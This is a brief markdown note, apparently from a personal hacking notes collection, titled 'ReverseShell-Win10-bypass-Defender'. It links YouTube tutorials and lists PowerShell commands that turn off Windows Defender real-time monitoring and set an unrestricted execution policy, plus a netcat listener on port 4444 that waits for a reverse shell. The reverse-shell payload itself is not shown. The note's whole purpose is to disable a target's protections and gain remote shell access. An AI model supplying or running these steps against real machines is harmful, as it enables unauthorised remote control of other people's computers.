---
tags:
  - linux
  - windows
  - shell
  - code
  - kali
  - hacking
---
# ReverseShell-Win10-bypass-Defender
This worked in 2021 for Windows 10.

Developed by Youtuber "TheDroneSmith".

Demonstration: 
https://youtu.be/XW6f86LXQ2I?si=S8PdQ9vV4Yg2yVJ7

Full Tutorial:
https://www.youtube.com/watch?v=1C6g6nJcdgc&t=0s

Powershell Command Execution as Administrator
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ExecutionPolicy Unrestricted
```
`a` = "Yes to All"

Kali LinuxShell
```sh
nc -vv -n -l -p 4444
```

